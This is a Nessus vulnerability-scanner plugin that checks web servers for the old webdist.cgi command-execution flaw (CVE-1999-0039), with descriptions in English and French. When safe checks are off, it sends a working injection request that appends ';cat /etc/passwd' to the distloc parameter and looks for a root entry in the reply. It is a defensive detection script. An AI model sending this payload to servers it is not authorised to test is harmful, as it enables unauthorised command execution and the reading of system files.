#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10299);
 script_version ("$Revision: 1.25 $");
 script_bugtraq_id(374);
 script_cve_id("CVE-1999-0039");
 
 name["english"] = "webdist.cgi";
 name["francais"] = "webdist.cgi";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "The 'webdist.cgi' cgi is installed. This CGI has
a well known security flaw that lets anyone execute arbitrary
commands with the privileges of the http daemon (root or nobody).

Solution : remove it from /cgi-bin.

Risk factor : Serious";


 desc["francais"] = "Le cgi 'webdist.cgi' est installé. Celui-ci possède
un problème de sécurité bien connu qui permet à n'importe qui de faire
executer des commandes arbitraires au daemon http, avec les privilèges
de celui-ci (root ou nobody). 

Solution : retirez-le de /cgi-bin.

Facteur de risque : Sérieux";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Checks for the presence of /cgi-bin/webdist.cgi";
 summary["francais"] = "Vérifie la présence de /cgi-bin/webdist.cgi";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_MIXED_ATTACK); # mixed
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

if(safe_checks())
{ 
  port = is_cgi_installed("webdist.cgi");
  if(port)
  { 
  data =  "
The 'webdist.cgi' cgi is installed. This CGI has
a well known security flaw that lets anyone execute arbitrary
commands with the privileges of the http daemon (root or nobody).

*** Nessus reports this vulnerability using only
*** information that was gathered. Use caution
*** when testing without safe checks enabled.

Solution : remove it from /cgi-bin.

Risk factor : Serious";
 	security_hole(port:port, data:data);
  }
  exit(0);
}


port = get_kb_item("Services/www");
if(!port) port = 80;
if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
 buf = string(dir,  "/webdist.cgi?distloc=;cat%20/etc/passwd");
 buf = http_get(item:buf, port:port);
 d = http_keepalive_send_recv(port:port, data:buf);
 if( d == NULL ) exit(0);
 if(egrep(pattern:".*root:.*:0:[01]:.*", string:d))security_hole(port);
}
